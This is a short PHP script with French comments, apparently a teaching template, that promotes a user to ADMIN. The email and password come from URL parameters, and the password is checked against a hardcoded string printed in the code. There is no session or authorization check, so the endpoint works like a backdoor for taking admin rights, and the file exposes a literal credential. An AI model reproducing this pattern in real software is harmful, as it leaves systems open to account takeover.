<?php
session_start();
// connexion 
require_once './config.php';
require_once './protection.php';

//update
// en vrai la parti connexion ou fait pas trop de update dessus mais vous aurai une trame  ^^

$email = protect_montexte($_GET['email']);
$pass = protect_montexte($_GET['password']);


if ($pass == "Rldepan*02") {

    //la ligne qui change d'une CREATE_USERS
    $sql = "UPDATE users SET role=? where login=?";
   
    if ($stmt = mysqli_prepare($link, $sql)) {
       
        mysqli_stmt_bind_param($stmt, "ss", $param_role, $param_login);

        $param_role = "ADMIN";
        $param_login = $email;

        if (mysqli_stmt_execute($stmt)) {
            mysqli_close($link);
            
            header('location:../index.php ');
            exit();
        }
    }
} else {

    header("location: ../index.php");
    exit();
}
